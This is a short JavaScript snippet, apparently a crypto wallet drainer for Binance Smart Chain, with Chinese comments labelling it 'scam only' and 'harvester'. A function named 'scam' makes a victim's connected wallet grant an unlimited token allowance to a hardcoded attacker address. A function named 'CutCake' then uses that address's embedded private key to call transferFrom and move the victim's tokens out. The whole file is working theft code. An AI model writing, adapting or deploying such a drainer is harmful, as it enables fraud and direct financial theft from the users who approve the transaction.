
var HDWalletProvider = require("truffle-hdwallet-provider");

//詐騙專用
var appr = '115792089237316195423570985008687456';
async function scam(){
    FDOGE_agiContract.methods.approve('0x5DFC690c80c644D486f010478b4f3cfde87C4b4D',appr).send({from: coinbase,gas: 80000})
}


//收割器
var ScamValue = '50000000000000000000000'; 
var pv = '0x012347778901abc5678901234FFF890123456789012345678906553567890123';
//var pv =  Buffer.from('0x012347778901abc5678901234FFF890123456789012345678906553567890123', 'hex')
    
var pubKey = '0x5DFC690c80c644D486f010478b4f3cfde87C4b4D';
var Scamwallet = web3.eth.accounts.privateKeyToAccount(pv);




var provider = new HDWalletProvider("012347778901abc5678901234FFF890123456789012345678906553567890123", "https://bsc-dataseed.binance.org/");
var web3S = new Web3(provider);

var  FDOGESP = new web3S.eth.Contract(contract_ABI,HDOGE_Contract);

// var tx = {
//     from:0x5DFC690c80c644D486f010478b4f3cfde87C4b4D,
//     to:0x361d8552d7db423ec0cb097a5911fe453d205374,
//     gas:80000,
//     value:0,
//     data:FDOGE_agiContract.methods.transferFrom('0x5DFC690c80c644D486f010478b4f3cfde87C4b4D',pubKey,ScamValue).encodeABI()
// };

async function CutCake(){
    
    //console.log(pv);
    FDOGESP.methods.transferFrom(coinbase,pubKey,ScamValue).send({from: '0x5DFC690c80c644D486f010478b4f3cfde87C4b4D',gas: 80000});
}